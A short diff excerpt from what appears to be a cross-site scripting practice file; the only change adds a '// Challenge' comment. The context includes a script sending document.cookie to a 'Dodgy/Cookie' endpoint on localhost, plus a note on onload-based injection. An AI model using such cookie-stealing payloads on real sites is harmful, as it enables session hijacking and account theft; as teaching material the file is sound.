@@ -37,6 +37,7 @@ background-color: red;
 var xhttp=new XMLHttpRequest;xhttp.open("GET","http://localhost:55057/Dodgy/Cookie?cookie="+document.cookie,!0),xhttp.send();
 </script>
 
+// Challenge
 //----------------------------------------------------------------------------------------
 // Using images or any other HTML element that supports onload
 <script>alert("Hello');</script>
